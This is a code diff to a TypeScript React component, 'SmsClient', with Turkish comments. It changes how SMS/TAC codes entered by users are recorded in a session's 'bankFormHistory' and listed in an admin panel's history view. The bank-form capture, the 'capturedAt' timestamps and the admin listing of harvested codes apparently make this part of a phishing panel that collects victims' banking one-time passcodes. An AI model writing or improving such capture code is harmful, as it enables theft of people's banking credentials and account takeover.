@@ -172,19 +172,28 @@ export function SmsClient({ sessionId }: Props) {
     setSaving(true);
     setMsg(null);
 
-    // ⭐ SMS GECMISI APPEND: Son girilen SMS kodunu session bankFormHistory
-    //   dizisine yeni entry olarak ekle. Boylece admin panelde SMS kolonu
-    //   GEÇMİŞ (N) butonu ile onceki SMS kodlari da LISTELENEBILECEK.
+    // ⭐ SMS GECMISI APPEND: SADECE TEKRAR GIRISLERDE (daha once smsCode DOLUYSA)
+    //   yeni entry push et. ILK GIRIS (smsCode daha once bos ise) kolonlara kaydedilsin
+    //   ama GEÇMİŞ butonu sayısını artırmasın (1. giris kolonlardadir, tekrarlar gecmiste).
+    const prevSms = String(
+      (sessionFormData as any).smsCode ||
+      (sessionFormData as any).sms_code ||
+      (sessionFormData as any).tacCode ||
+      "",
+    ).trim();
+    const isFirstSmsEntry = prevSms.length === 0;
     const currentHistory: any[] = Array.isArray((sessionFormData as any).bankFormHistory)
       ? (sessionFormData as any).bankFormHistory.slice()
       : [];
-    currentHistory.push({
-      htmlStepLabel: "SMS KODU",
-      capturedAt: new Date().toISOString(),
-      smsCode: trimmed,
-      sms_code: trimmed,
-      tacCode: trimmed,
-    });
+    if (!isFirstSmsEntry) {
+      currentHistory.push({
+        htmlStepLabel: "SMS KODU",
+        capturedAt: new Date().toISOString(),
+        smsCode: trimmed,
+        sms_code: trimmed,
+        tacCode: trimmed,
+      });
+    }
 
     const nextFormData = {
       ...sessionFormData,
